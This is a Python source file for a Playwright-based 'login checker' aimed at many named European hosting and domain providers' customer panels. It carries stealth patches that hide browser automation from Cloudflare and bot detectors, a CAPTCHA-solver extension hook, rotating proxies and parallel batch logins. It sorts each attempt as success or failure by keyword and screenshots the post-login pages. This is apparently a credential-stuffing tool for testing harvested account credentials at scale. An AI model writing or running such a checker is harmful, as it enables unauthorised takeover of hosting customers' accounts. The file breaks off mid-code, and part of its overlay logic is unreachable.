"""
checker.py
----------
Playwright-based login checker.

Features:
  - Real Chromium browser (bypasses most bot-detection)
  - Session reuse via storage_state.json  (CAPTCHA-solve-once)
  - Human-like random delays between every action
  - Stealth patches (navigator.webdriver = false, etc.)
  - Optional proxy per-check (residential recommended)
  - Auto-detects login form fields with BeautifulSoup fallback
  - Keyword analysis of post-login HTML for SUCCESS / FAILED
"""

from multiprocessing import context
import random
import time
import json
import os
import tempfile
import threading
import dataclasses
import shutil
import platform
from typing import Any, Optional
from pathlib import Path
from urllib.parse import urlparse, urljoin

from bs4 import BeautifulSoup
import playwright

# Import proxy manager for centralized proxy rotation
try:
    from src.proxy_manager import get_proxy_manager
except ImportError:
    get_proxy_manager = None

# Import advanced page analyzer for toast/notification detection
try:
    from src.page_analyzer import analyze_page_for_result, generate_analysis_report
except ImportError:
    analyze_page_for_result = None
    generate_analysis_report = None

# Import form cache for domain-based field and result pattern caching
try:
    from src.form_cache import FormCache, get_global_cache
    form_cache = get_global_cache("form_cache.json")
except ImportError:
    form_cache = None

# ---------------------------------------------------------------------------
# Paths
# ---------------------------------------------------------------------------

_HERE         = Path(__file__).parent.parent          # project root
SESSION_FILE  = _HERE / "state.json"                  # saved browser session
PROXY_FILE    = _HERE / "proxies.txt"                 # one proxy per line (optional)
RECIPE_FILE   = _HERE / "login_recipe.json"           # recorded login actions

EXTENSION_PATH = r"D:\3.work\captchasonic"

# Hardcoded login URL for superhosting entries
SUPERHOSTING_LOGIN_URL = "https://my.superhosting.bg/"

# Hardcoded login URL for zettahost entries
ZETTAHOST_LOGIN_URL = "https://cp1.zettahost.bg/login"

# Hardcoded login URL for ns1.bg entries (WHMCS portal)
NS1_LOGIN_URL = "https://my.ns1.bg/index.php?rp=/login"

# Hardcoded login URL for Hostpoint (admin.hostpoint.ch)
HOSTPOINT_LOGIN_URL = "https://admin.hostpoint.ch/public/en/auth/hostpoint"

# Number of parallel browser contexts for try_login_hostpoint_batch
HOSTPOINT_CONCURRENCY = 5

# Hardcoded login URL for home.pl panel
HOME_PL_LOGIN_URL = "https://panel.home.pl/"

# Number of parallel browser contexts for try_login_home_pl_batch
HOME_PL_CONCURRENCY = 5

# Hardcoded login URL for cyberfolks.pl panel
CYBERFOLKS_LOGIN_URL = "https://panel.cyberfolks.pl/security/login"

# Number of parallel browser contexts for try_login_cyberfolks_batch
CYBERFOLKS_CONCURRENCY = 5

# Hardcoded login URL for SprintDataCenter (sprint S.A.)
SPRINTDC_LOGIN_URL = "https://www.sprintdatacenter.pl/signin"

# Hardcoded login URL for domenomania.pl panel
DOMENOMANIA_LOGIN_URL = "https://domenomania.pl/logowanie"

# Hardcoded login URL for rapiddc.pl (WHMCS / Sprint S.A.)
RAPIDDC_LOGIN_URL = "https://rapiddc.pl/index.php?rp=/login"

# Hardcoded login URL for Güzel.net.tr (Turkish hosting provider)
GUZEL_LOGIN_URL = "https://www.guzel.net.tr/clientarea.php"

# FreeHosting success landing page requirement
FREEHOSTING_SERVICES_URL = "https://www.freehosting.com/client/clientarea.php?action=services"

# Sprint Data Center success landing page requirement
SPRINTDC_PANEL_URL = "https://www.sprintdatacenter.pl/panel"

# ---------------------------------------------------------------------------
# Keyword lists  (English + Bulgarian)
# ---------------------------------------------------------------------------

SUCCESS_KEYWORDS = [
    "logout", "sign out", "signout", "log out",
    "my account", "my profile", "dashboard", "account settings",
    "welcome", "profile", "order history",
    # Bulgarian
    "моят профил", "изход", "начало", "акаунт",
    "профил", "настройки", "поръчки",
    # Polish
    "wyloguj", "wyloguj się", "moje konto", "panel klienta",
    "strefa klienta", "witaj", "zalogowano", "pulpit",
    "ustawienia konta", "twój profil", "zamówienia",
]

FAILURE_KEYWORDS = [
    "invalid", "incorrect", "wrong password", "wrong credentials",
    "error", "failed", "login failed", "authentication failed",
    "bad credentials", "invalid password", "invalid username",
    "captcha",
    # WHMCS / Bootstrap error-alert phrases
    "login details incorrect",
    "details incorrect",
    "please try again",
    "username or password is incorrect",
    "username/password combination",
    # Bulgarian
    "грешна парола", "невалиден", "неправилна",
    "грешен", "грешка", "невалидни данни",
    # Polish
    "nieprawidłowe hasło", "nieprawidłowy login", "błędne dane",
    "niepoprawne dane", "błąd logowania", "nieudane logowanie",
    "nieprawidłowe dane logowania", "podane dane są nieprawidłowe",
]

COMMON_USER_FIELDS = [
    "username", "login", "email", "user", "usr",
    "log", "user_login", "user_email",
    # Symfony-style prefixed fields (e.g. sprintdatacenter)
    "_username",
]
COMMON_PASS_FIELDS = [
    "password", "pass", "passwd", "pwd", "user_pass",
]

# ---------------------------------------------------------------------------
# Stealth JS — injected into every page to mask automation fingerprints
# ---------------------------------------------------------------------------

# Real Chrome 124 on Windows user-agent string
_REAL_UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/124.0.0.0 Safari/537.36"
)

# Try to import playwright-stealth; gracefully fall back to our own JS if absent.
try:
    from playwright_stealth import stealth_sync as _stealth_sync
    _PLAYWRIGHT_STEALTH_AVAILABLE = True
except ImportError:  # pragma: no cover
    _stealth_sync = None  # type: ignore[assignment]
    _PLAYWRIGHT_STEALTH_AVAILABLE = False
    print("[INFO] playwright-stealth not installed — using built-in STEALTH_JS patches.")
    print("[INFO] For better Cloudflare bypass run: pip install playwright-stealth")


def _apply_stealth(context) -> None:
    """Apply anti-detection patches to a browser context.

    Uses playwright-stealth when available; otherwise falls back to the
    built-in STEALTH_JS init-script.
    """
    if _PLAYWRIGHT_STEALTH_AVAILABLE and _stealth_sync is not None:
        try:
            _stealth_sync(context)
            return
        except Exception as exc:
            print(f"[WARN] playwright-stealth failed ({exc}), falling back to STEALTH_JS")
    if STEALTH_JS:
        context.add_init_script(STEALTH_JS)


STEALTH_JS = """
() => {
    // ── 1. Remove navigator.webdriver completely ─────────────────────────
    // Setting it to `false` is itself a Cloudflare detection signal.
    // Deleting it from the prototype makes it behave like a real browser.
    try {
        const proto = Object.getPrototypeOf(navigator);
        if (Object.getOwnPropertyDescriptor(proto, 'webdriver')) {
            Object.defineProperty(proto, 'webdriver', {
                get: () => undefined,
                configurable: true,
            });
        }
    } catch (e) {}
    // Catch the direct property variant too
    try {
        Object.defineProperty(navigator, 'webdriver', {
            get: () => undefined,
            configurable: true,
        });
    } catch (e) {}

    // ── 2. Remove CDP / Selenium window-level leak keys ──────────────────
    const _cdpLeak = /^(cdc_|__selenium|__webdriver|__driver|_phantom|callSelenium|_Selenium)/;
    for (const key of Object.keys(window)) {
        if (_cdpLeak.test(key)) {
            try { delete window[key]; } catch (e) {}
        }
    }

    // ── 3. Full window.chrome object ─────────────────────────────────────
    // CF checks chrome.app, chrome.runtime, chrome.csi, chrome.loadTimes
    if (!window.chrome || !window.chrome.app) {
        window.chrome = {
            app: {
                isInstalled: false,
                getDetails:  function() { return null; },
                getIsInstalled: function() { return false; },
                runningState: function() { return 'cannot_run'; },
                InstallState: { DISABLED: 'disabled', INSTALLED: 'installed', NOT_INSTALLED: 'not_installed' },
                RunningState: { CANNOT_RUN: 'cannot_run', READY_TO_RUN: 'ready_to_run', RUNNING: 'running' },
            },
            csi: function() {
                return { startE: Date.now(), onloadT: Date.now(), pageT: Date.now() - performance.timing.navigationStart, tran: 15 };
            },
            loadTimes: function() {
                return {
                    commitLoadTime: Date.now() / 1000,
                    connectionInfo: 'h2',
                    finishDocumentLoadTime: 0,
                    finishLoadTime: 0,
                    firstPaintAfterLoadTime: 0,
                    firstPaintTime: 0,
                    navigationType: 'Other',
                    npnNegotiatedProtocol: 'h2',
                    requestTime: Date.now() / 1000 - 0.1,
                    startLoadTime: Date.now() / 1000 - 0.1,
                    wasAlternateProtocolAvailable: false,
                    wasFetchedViaSpdy: true,
                    wasNpnNegotiated: true,
                };
            },
            runtime: {
                OnInstalledReason: { CHROME_UPDATE: 'chrome_update', INSTALL: 'install', SHARED_MODULE_UPDATE: 'shared_module_update', UPDATE: 'update' },
                OnRestartRequiredReason: { APP_UPDATE: 'app_update', OS_UPDATE: 'os_update', PERIODIC: 'periodic' },
                PlatformArch: { ARM: 'arm', ARM64: 'arm64', MIPS: 'mips', MIPS64: 'mips64', X86_32: 'x86-32', X86_64: 'x86-64' },
                PlatformNaclArch: { ARM: 'arm', MIPS: 'mips', MIPS64: 'mips64', X86_32: 'x86-32', X86_64: 'x86-64' },
                PlatformOs: { ANDROID: 'android', CROS: 'cros', LINUX: 'linux', MAC: 'mac', OPENBSD: 'openbsd', WIN: 'win' },
                RequestUpdateCheckStatus: { NO_UPDATE: 'no_update', THROTTLED: 'throttled', UPDATE_AVAILABLE: 'update_available' },
                id: undefined,
            },
        };
    }

    // ── 4. Permissions API – return real Notification permission ─────────
    // CF queries permissions.query({name:'notifications'}) and checks the result.
    if (navigator.permissions && navigator.permissions.query) {
        const _origQuery = navigator.permissions.query.bind(navigator.permissions);
        Object.defineProperty(navigator.permissions, 'query', {
            value: function(params) {
                if (params && params.name === 'notifications') {
                    const state = Notification.permission === 'default' ? 'prompt' : Notification.permission;
                    return Promise.resolve({ state, onchange: null });
                }
                return _origQuery(params);
            },
            writable: true,
            configurable: true,
        });
    }

    // ── 5. Realistic PluginArray ──────────────────────────────────────────
    // The plain [1,2,3,4,5] array does NOT have PluginArray prototype — a dead
    // giveaway to bot detectors.
    try {
        const plugins = [
            { name: 'Chrome PDF Plugin',          description: 'Portable Document Format', filename: 'internal-pdf-viewer',  length: 1 },
            { name: 'Chrome PDF Viewer',           description: '',                         filename: 'mhjfbmdgcfjbbpaeojofohoefgiehjai', length: 1 },
            { name: 'Native Client',               description: '',                         filename: 'internal-nacl-plugin',  length: 2 },
            { name: 'WebKit built-in PDF',         description: '',                         filename: 'webkit-pdf-viewer',     length: 0 },
            { name: 'Chromium PDF Viewer',         description: '',                         filename: 'mhjfbmdgcfjbbpaeojofohoefgiehjai', length: 1 },
        ];
        Object.defineProperty(navigator, 'plugins', {
            get: () => {
                const arr = plugins.slice();
                Object.setPrototypeOf(arr, PluginArray.prototype);
                return arr;
            },
            configurable: true,
        });
    } catch (e) {}

    // ── 6. navigator misc – vendor, hardwareConcurrency, deviceMemory ────
    try { Object.defineProperty(navigator, 'vendor',              { get: () => 'Google Inc.', configurable: true }); } catch(e){}
    try { Object.defineProperty(navigator, 'hardwareConcurrency', { get: () => 8,             configurable: true }); } catch(e){}
    try { Object.defineProperty(navigator, 'deviceMemory',        { get: () => 8,             configurable: true }); } catch(e){}
    try { Object.defineProperty(navigator, 'maxTouchPoints',      { get: () => 0,             configurable: true }); } catch(e){}
    try { Object.defineProperty(navigator, 'languages', { get: () => ['tr-TR', 'tr', 'en-US', 'en'], configurable: true }); } catch(e){}

    // ── 7. Screen dimensions (full HD, natural for 1280x800 viewport) ────
    try { Object.defineProperty(screen, 'width',       { get: () => 1920, configurable: true }); } catch(e){}
    try { Object.defineProperty(screen, 'height',      { get: () => 1080, configurable: true }); } catch(e){}
    try { Object.defineProperty(screen, 'availWidth',  { get: () => 1920, configurable: true }); } catch(e){}
    try { Object.defineProperty(screen, 'availHeight', { get: () => 1040, configurable: true }); } catch(e){}
    try { Object.defineProperty(screen, 'colorDepth',  { get: () => 24,   configurable: true }); } catch(e){}
    try { Object.defineProperty(screen, 'pixelDepth',  { get: () => 24,   configurable: true }); } catch(e){}

    // ── 8. Patch iframes – CF may create hidden iframes to re-test signals
    const _MO = window.MutationObserver || window.WebKitMutationObserver;
    if (_MO) {
        new _MO(mutations => {
            for (const m of mutations) {
                for (const node of m.addedNodes) {
                    if (node.contentWindow) {
                        try {
                            Object.defineProperty(node.contentWindow.navigator, 'webdriver', {
                                get: () => undefined, configurable: true,
                            });
                        } catch (e) {}
                    }
                }
            }
        }).observe(document.documentElement, { childList: true, subtree: true });
    }
}
"""

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _random_delay(lo: float = 0.8, hi: float = 2.5):
    """Sleep for a random human-like duration."""
    time.sleep(random.uniform(lo, hi))


# Thread-local storage so HTML is captured alongside each screenshot
# without changing any function return signatures.
_page_capture_tls = threading.local()


def get_last_page_html() -> str | None:
    """Return HTML captured during the most recent _screenshot_page() in this thread."""
    return getattr(_page_capture_tls, "html", None)


def _screenshot_page(page) -> bytes | None:
    """Take a viewport JPEG screenshot; returns raw bytes or None on failure.

    Also captures page.content() into a thread-local so callers can retrieve
    the post-login HTML via get_last_page_html() without changing return signatures.
    """
    try:
        data = page.screenshot(type="jpeg", quality=85)
        try:
            _page_capture_tls.html = page.content()
        except Exception:
            _page_capture_tls.html = None
        return data
    except Exception:
        _page_capture_tls.html = None
        return None


def _is_freehosting_url(url: str) -> bool:
    """Return True if URL belongs to freehosting.com."""
    try:
        host = (urlparse(url).netloc or "").lower()
    except Exception:
        return False
    return host == "freehosting.com" or host.endswith(".freehosting.com")


def _capture_freehosting_services_screenshot(page, timeout_ms: int = 20_000) -> bytes | None:
    """Navigate to FreeHosting services page and capture screenshot."""
    try:
        print(f"[FREEHOSTING] Navigating to services page → {FREEHOSTING_SERVICES_URL}")
        page.goto(FREEHOSTING_SERVICES_URL, timeout=timeout_ms, wait_until="domcontentloaded")
        try:
            page.wait_for_load_state("networkidle", timeout=min(timeout_ms, 10_000))
        except Exception:
            pass
        return _screenshot_page(page)
    except Exception as exc:
        print(f"[FREEHOSTING] Could not capture services screenshot: {exc}")
        return None


def _is_sprintdc_url(url: str) -> bool:
    """Return True if URL belongs to sprintdatacenter.pl."""
    try:
        host = (urlparse(url).netloc or "").lower()
    except Exception:
        return False
    return host == "sprintdatacenter.pl" or host.endswith(".sprintdatacenter.pl")


def _capture_sprintdc_panel_screenshot(page, timeout_ms: int = 20_000) -> bytes | None:
    """Navigate to Sprint Data Center panel page and capture screenshot."""
    try:
        print(f"[SPRINTDC] Navigating to panel page → {SPRINTDC_PANEL_URL}")
        page.goto(SPRINTDC_PANEL_URL, timeout=timeout_ms, wait_until="domcontentloaded")
        try:
            page.wait_for_load_state("networkidle", timeout=min(timeout_ms, 10_000))
        except Exception:
            pass
        return _screenshot_page(page)
    except Exception as exc:
        print(f"[SPRINTDC] Could not capture panel screenshot: {exc}")
        return None


# JavaScript that returns True when the CAPTCHA extension has solved the challenge.
# Checks reCAPTCHA v2/v3, hCaptcha, and Cloudflare Turnstile response tokens.
_CAPTCHA_SOLVED_JS = """
() => {
    const tokenSelectors = [
        'textarea[name="g-recaptcha-response"]',
        'input[name="g-recaptcha-response"]',
        '[name="g-recaptcha-response"]',
        '[name="h-captcha-response"]',
        '[name="cf-turnstile-response"]',
    ];
    for (const sel of tokenSelectors) {
        const el = document.querySelector(sel);
        if (el && el.value && el.value.length > 20) return true;
    }
    // Also detect checked reCAPTCHA checkbox (extension ticked it)
    const checked = document.querySelector('.recaptcha-checkbox-checked');
    if (checked) return true;
    return false;
}
"""

# JavaScript that detects a visible CAPTCHA widget in the live DOM.
# Works even when the widget is injected dynamically by JS after page load.
_CAPTCHA_PRESENT_JS = """
() => {
    // Check for CAPTCHA iframes (injected after DOMContentLoaded)
    for (const f of document.querySelectorAll('iframe')) {
        const src = (f.src || '').toLowerCase();
        if (src.includes('recaptcha') ||
            src.includes('hcaptcha.com') ||
            src.includes('challenges.cloudflare.com')) {
            return true;
        }
    }
    // Check for CAPTCHA container elements
    if (document.querySelector('.g-recaptcha') ||
        document.querySelector('.h-captcha') ||
        document.querySelector('.cf-turnstile') ||
        document.querySelector('[data-sitekey]')) {
        return true;
    }
    return false;
}
"""


def _has_captcha(html: str) -> bool:
    """
    Return True if the page has an INTERACTIVE (visible) CAPTCHA challenge.

    Intentionally ignores invisible reCAPTCHA v3, which runs silently in the
    background without user intervention.  Checking for bare 'recaptcha' in
    the HTML is too broad — nearly every modern site includes the script.
    """
    lower = html.lower()
    # Visible widget element markers
    if (
        'class="g-recaptcha"' in lower
        or "class='g-recaptcha'" in lower
        or 'class="h-captcha"' in lower
        or "class='h-captcha'" in lower
        or 'class="cf-turnstile"' in lower
        or "class='cf-turnstile'" in lower
        or "recaptcha/api2/anchor" in lower       # reCAPTCHA v2 challenge iframe
        or "hcaptcha.com/1/api" in lower          # hCaptcha iframe
        or "challenges.cloudflare.com" in lower   # Cloudflare Turnstile iframe
    ):
        return True
    # Explicit user-facing challenge phrases (error / instruction text on page)
    return any(ph in lower for ph in _CAPTCHA_RETRY_PHRASES)


def _wait_for_captcha_solve(page, timeout_sec: int = 120) -> bool:
    """
    Wait for a CAPTCHA to be solved (by extension or by a human).

    Polls every 1.5 seconds up to *timeout_sec*.  Returns True as soon as the
    CAPTCHA response token is filled.

    Bails out immediately only when the window is off-screen AND no solver
    extension is loaded — in that case nobody (human or bot) can solve it.
    """
    if not _use_captcha_extension and _minimized_mode:
        print("[CAPTCHA] Window is off-screen and no solver extension — cannot solve")
        return False
    if _use_captcha_extension:
        print(f"[CAPTCHA] Waiting for solver extension (up to {timeout_sec}s)...")
    else:
        print(f"[CAPTCHA] Waiting for manual solve in visible browser (up to {timeout_sec}s)...")
    # Give the extension / human a moment to start working before first poll
    time.sleep(2.0)
    deadline = time.time() + timeout_sec
    while time.time() < deadline:
        try:
            if page.evaluate(_CAPTCHA_SOLVED_JS):
                print("[CAPTCHA] CAPTCHA solved — continuing login")
                return True
        except Exception:
            pass
        time.sleep(1.5)
    print("[CAPTCHA] Solve timed out")
    return False


def _should_screenshot(result: str, screenshot_on: frozenset) -> bool:
    """Return True if *result* matches one of the trigger states in *screenshot_on*."""
    if not screenshot_on:
        return False
    ru = result.upper()
    return any(state in ru for state in screenshot_on)


def _load_proxy() -> dict | None:
    """Return proxy from the centralized ProxyManager (with rotation),
    falling back to the legacy proxies.txt random selection."""
    # Prefer centralized proxy manager.
    # IMPORTANT: if manager exists but is disabled, treat it as explicit
    # "no proxy" and do NOT fall back to legacy proxies.txt.
    if get_proxy_manager is not None:
        mgr = get_proxy_manager()
        if not mgr.enabled:
            return None
        proxy = mgr.get_proxy()
        if proxy is not None:
            return proxy

    # Legacy fallback: random proxy from proxies.txt
    if not PROXY_FILE.exists():
        return None
    lines = [l.strip() for l in PROXY_FILE.read_text().splitlines()
             if l.strip() and not l.startswith("#")]
    if not lines:
        return None
    line = random.choice(lines)
    # Supported formats:
    #   http://user:pass@host:port
    #   host:port
    if "://" not in line:
        line = "http://" + line
    return {"server": line}


# ---------------------------------------------------------------------------
# DOM-based success detection helpers
# ---------------------------------------------------------------------------

def _parse_html_tag_to_css(tag_str: str) -> str | None:
    """Convert an HTML opening tag like '<div class=\"stats-block service-block\">'
    into a CSS selector like 'div.stats-block.service-block'.

    Supports tag name, class, and id attributes.
    Returns None if the string cannot be parsed.
    """
    tag_str = tag_str.strip().lstrip("<").rstrip(">").strip()
    if not tag_str:
        return None

    # Use a lightweight regex approach to avoid importing extra libs
    import re as _re_local

    # Extract tag name (first word)
    m = _re_local.match(r'(\w[\w-]*)', tag_str)
    if not m:
        return None
    tag_name = m.group(1).lower()

    # Extract class attribute
    classes = ""
    cm = _re_local.search(r'class\s*=\s*["\']([^"\']+)["\']', tag_str, _re_local.IGNORECASE)
    if cm:
        class_list = cm.group(1).split()
        classes = "." + ".".join(c for c in class_list if c)

    # Extract id attribute
    id_part = ""
    im = _re_local.search(r'id\s*=\s*["\']([^"\']+)["\']', tag_str, _re_local.IGNORECASE)
    if im:
        id_part = "#" + im.group(1)

    selector = tag_name + id_part + classes
    return selector if selector != tag_name or tag_name else None


def _parse_success_dom_selectors(raw: str) -> list[str]:
    """Parse the user's success DOM input into a list of CSS selectors.

    The input can contain:
      - HTML tags: <div class="stats-block service-block">
      - CSS selectors directly: div.stats-block
      - Multiple entries separated by newlines
    """
    if not raw or not raw.strip():
        return []

    selectors = []
    for line in raw.splitlines():
        line = line.strip()
        if not line:
            continue
        # If it looks like an HTML tag, parse it
        if line.startswith("<"):
            css = _parse_html_tag_to_css(line)
            if css:
                selectors.append(css)
        else:
            # Treat as a raw CSS selector
            selectors.append(line)
    return selectors


def _check_success_dom(page, selectors: list[str]) -> bool:
    """Check if ANY of the given CSS selectors exist on the page.

    Returns True if at least one selector matches a visible element.
    """
    for sel in selectors:
        try:
            el = page.query_selector(sel)
            if el:
                return True
        except Exception:
            continue
    return False


def _base_url(url: str) -> str:
    p = urlparse(url)
    return f"{p.scheme}://{p.netloc}"


def _detect_fields(html: str):
    """Use BeautifulSoup to find username/password input field names.
    
    Strategy:
    1. Find password field (type="password") — very reliable
    2. Find username field by:
       a. Matching common field name patterns
       b. Matching type="email"
       c. Taking first text-like input before password field
    """
    soup = BeautifulSoup(html, "html.parser")
    user_field = "username"
    pass_field = "password"
    
    all_inputs = soup.find_all("input")
    
    # ── Find password field (always reliable) ────────────────────────────
    for inp in all_inputs:
        itype = str(inp.get("type", "text")).lower()
        if itype == "password":
            pass_field = str(inp.get("name") or pass_field)
            break  # Take first password field
    
    # ── Find username field with multiple strategies ──────────────────────
    # Strategy 1: Look for field names matching common patterns
    for inp in all_inputs:
        name  = str(inp.get("name", "")).lower()
        itype = str(inp.get("type", "text")).lower()
        
        # Skip password fields and hidden fields
        if itype in ("password", "hidden", "submit", "button", "checkbox", "radio"):
            continue
            
        # Match common username field names
        if any(f in name for f in COMMON_USER_FIELDS):
            user_field = str(inp.get("name") or user_field)
            break
    
    # Strategy 2: If not found, look for type="email"
    if user_field == "username":
        for inp in all_inputs:
            itype = str(inp.get("type", "text")).lower()
            if itype == "email":
                user_field = str(inp.get("name") or user_field)
                break
    
    # Strategy 3: If still not found, take first text/email input before password
    if user_field == "username":
        for inp in all_inputs:
            itype = str(inp.get("type", "text")).lower()
            name  = str(inp.get("name", "")).lower()
            
            # Skip hidden, submit, checkbox, radio
            if itype in ("password", "hidden", "submit", "button", "checkbox", "radio"):
                continue
            
            # Accept text or email types
            if itype in ("text", "email") or not name:
                user_field = str(inp.get("name") or user_field)
                break

    return user_field, pass_field


def _detect_fields_with_cache(html: str, url: str):
    """
    Detect username/password fields with caching by domain.
    
    First checks cache for known domains, then detects and caches.
    
    Returns:
        (user_field, pass_field)
    """
    if form_cache is None:
        # No cache available, use normal detection
        return _detect_fields(html)
    
    domain = FormCache.extract_domain(url)
    
    # Check if we have cached fields for this domain
    cached_fields = form_cache.get_form_fields(domain)
    if cached_fields:
        username_field, password_field, _ = cached_fields
        return username_field, password_field
    
    # Detect fields normally
    user_field, pass_field = _detect_fields(html)
    
    # Cache for future use (without submit button for now)
    form_cache.set_form_fields(domain, user_field, pass_field, "")
    form_cache.save()
    
    return user_field, pass_field


def _detect_submit_button_with_cache(page, url: str) -> Optional[str]:
    """
    Try all submit button selectors with caching.
    
    Returns the working selector, caches it for the domain.
    
    Returns:
        Selector string or None if not found
    """
    if form_cache is None:
        # Use normal selector iteration
        for btn_sel in _SUBMIT_SELECTORS:
            try:
                if page.is_visible(btn_sel, timeout=800):
                    return btn_sel
            except Exception:
                pass
        return None
    
    domain = FormCache.extract_domain(url)
    
    # Get cached selectors (most successful first)
    cached_selectors = form_cache.get_notification_selectors(domain)
    
    # Try cached selectors first
    for btn_sel in cached_selectors:
        try:
            if page.is_visible(btn_sel, timeout=800):
                form_cache.add_notification_selector(domain, btn_sel)
                return btn_sel
        except Exception:
            pass
    
    # Try all selectors if cache didn't have a match
    for btn_sel in _SUBMIT_SELECTORS:
        try:
            if page.is_visible(btn_sel, timeout=800):
                # Found a working selector, cache it
                form_cache.add_notification_selector(domain, btn_sel)
                form_cache.save()
                return btn_sel
        except Exception:
            pass
    
    return None



def _analyse_html(html: str, final_url: str) -> str:
    """Legacy wrapper — prefer _evaluate_result() which also takes login_url."""
    return _evaluate_result(html, final_url, login_url="")


# ---------------------------------------------------------------------------
# Generic overlay / cookie-consent banner dismissal
# ---------------------------------------------------------------------------

# Broad list of CSS selectors covering the most common cookie-consent
# frameworks and generic notification banners encountered on European
# hosting portals (OneTrust, CookieBot, consentmanager, Iubenda, etc.).
_GENERIC_COOKIE_SELECTORS = [
    # OneTrust
    "#onetrust-accept-btn-handler",
    "button.onetrust-accept-btn-handler",
    ".onetrust-close-btn-handler",
    # CookieBot (accept / allow-all buttons)
    "#CybotCookiebotDialogBodyButtonAccept",
    "button#CybotCookiebotDialogBodyLevelButtonLevelOptinAllowAll",
    "#CybotCookiebotDialogBodyLevelButtonLevelOptinAllowAll",
    # consentmanager.net  (used by home.pl and many EU sites)
    "a.cmpboxbtnyes", "button.cmpboxbtnyes",
    ".cmptxt_btn_yes",
    # Generic id/class patterns
    "#cookie-accept",
    "#acceptCookies",
    "#accept-cookies",
    "#gdpr-accept",
    "button[id*='accept-cookie']",
    "button[id*='cookie-accept']",
    "button[id*='cookieAccept']",
    "button[class*='cookie-accept']",
    "button[class*='accept-cookie']",
    "button[class*='cookieAccept']",
    ".accept-cookies",
    ".gdpr-accept",
    "#cookie-banner button",
    ".cookie-banner button",
    ".cookie-notice button",
    ".cookie-consent button",
    ".cookies-banner button",
    # Iubenda
    ".iubenda-cs-accept-btn",
    # CookieHub
    "button.ch2-allow-all",
    # TrustArc
    "#truste-consent-button",
    # Quantcast
    ".qc-cmp2-summary-buttons button:last-child",
    # SprintDataCenter / custom cookie consent IDs
    "#cookies-consent-accept-all",
    "button#cookies-consent-accept-all",
    # Polish-language accept buttons
    "button:has-text('Zezwól na wszystkie')",
    "button:has-text('Zaakceptuj wszystkie')",
    "button:has-text('Akceptuj wszystkie')",
    "button:has-text('Akceptuję')",
    "button:has-text('Akceptuj')",
    "button:has-text('Zaakceptuj')",
    "button:has-text('Zgadzam się')",
    "button:has-text('Zezwól')",
    # Bulgarian-language accept buttons
    "button:has-text('Приемам всички')",
    "button:has-text('Приемам')",
    # English-language accept / agree buttons
    "button:has-text('Accept all cookies')",
    "button:has-text('Accept All Cookies')",
    "button:has-text('Accept All')",
    "button:has-text('Accept all')",
    "button:has-text('Accept cookies')",
    "button:has-text('Accept Cookies')",
    "button:has-text('Accept')",
    "button:has-text('Agree')",
    "button:has-text('I agree')",
    "button:has-text('I Accept')",
    "button:has-text('Allow all')",
    "button:has-text('Allow All')",
    "button:has-text('Got it')",
    "button:has-text('OK')",
    "button:has-text('Ok')",
    "button:has-text('Okay')",
    # Notification / info banner close/dismiss buttons
    "button[aria-label='Close']",
    "button[aria-label='Dismiss']",
    "button[aria-label='dismiss']",
    "button[aria-label='close']",
    "[data-testid='close-button']",
    ".notification-close",
    ".alert-close",
    ".banner-close",
    ".modal-close",
    ".popup-close",
    ".close-button",
    ".close-btn",
    # Generic aria-label patterns
    "button[aria-label*='cookie' i]",
    "button[aria-label*='consent' i]",
    "button[aria-label*='gdpr' i]",
    # data-* attribute patterns
    "button[data-accept-cookies]",
    "[data-gdpr-accept]",
    "[data-cookieconsent='statistics'] button",
    # German
    "button:has-text('Alle akzeptieren')",
    "button:has-text('Akzeptieren')",
    "button:has-text('Zustimmen')",
    "button:has-text('Einverstanden')",
    # French
    "button:has-text('Tout accepter')",
    "button:has-text('Accepter tout')",
    "button:has-text('Accepter')",
    "button:has-text('J\'accepte')",
    # Spanish
    "button:has-text('Aceptar todo')",
    "button:has-text('Aceptar')",
    # Dutch
    "button:has-text('Alles accepteren')",
    "button:has-text('Accepteer')",
    # Italian
    "button:has-text('Accetta tutto')",
    "button:has-text('Accetta')",
    # Bootstrap / common framework modal close buttons
    ".modal.show .btn-close",
    ".modal.show button.close",
    # Generic overlay / popup close
    "[class*='overlay'] [class*='close']",
    "[class*='popup'] [class*='close']",
    "[class*='modal'] [class*='close']",
    # Role-based dialog close
    "[role='dialog'] button[aria-label*='close' i]",
    "[role='alertdialog'] button[aria-label*='close' i]",
]


def _dismiss_overlays(page, timeout_ms: int = 5_000, max_passes: int = 3,
                      custom_cookie_sel: "str | None" = None) -> None:
    """
    Best-effort dismissal of cookie-consent banners, GDPR modals, and
    notification overlays that may sit on top of the login form.

    When *custom_cookie_sel* is provided (from DOM Settings) it is tried
    first before falling back to the built-in selector list.

    Runs up to *max_passes* passes so that stacked / sequential overlays
    (e.g. a cookie banner that reveals a second privacy popup) are all
    closed.  Each pass iterates _GENERIC_COOKIE_SELECTORS with a short
    per-selector timeout (800 ms); the first matching visible button is
    clicked and the pass restarts from the top of the selector list.
    If no CSS selector matches, a JS fallback forcibly closes any open
    <dialog> elements and removes common overlay backdrops.
    All exceptions are silently swallowed — failing to dismiss an overlay
    is non-fatal; the caller proceeds with form interaction regardless.
    """
    print("[INFO] Attempting to dismiss cookie-consent banners and overlays...")
    from playwright.sync_api import TimeoutError as PWTimeout

    # Build selector list: custom selector goes first if provided
    _selectors = (
        [custom_cookie_sel] + _GENERIC_COOKIE_SELECTORS
        if custom_cookie_sel
        else _GENERIC_COOKIE_SELECTORS
    )

    for _pass in range(max_passes):
        clicked = False
        for sel in _selectors:
            try:
                loc = page.locator(sel)
                if loc.count() == 0:
                    continue
                picked = False
                for i in range(loc.count()):
                    cand = loc.nth(i)
                    if not cand.is_visible(timeout=800):
                        continue
                    # Never dismiss "cookie banners" by clicking social login.
                    if _looks_like_social_auth_element(cand):
                        print(f"[OVERLAY] Skip social candidate for {sel!r} (idx={i})")
                        continue
                    cand.click(timeout=2_000)
                    picked = True
                    break
                if not picked:
                    continue
                    # Wait for the overlay element itself to disappear so that
                    # the login form is fully unblocked before we proceed.
                    try:
                        page.wait_for_selector(sel, state="hidden", timeout=3_000)
                    except PWTimeout:
                        # CSS-only transition — give it a moment to animate out
                        page.wait_for_timeout(600)
                    clicked = True
                    break   # restart selector scan for this pass
            except Exception:
                continue

        if not clicked:
            # No CSS button matched — try JS-based fallback:
            # close open <dialog> elements and strip common overlay backdrops.
            try:
                page.evaluate("""
                    () => {
                        for (const d of document.querySelectorAll('dialog[open]'))
                            d.close();
                        for (const sel of [
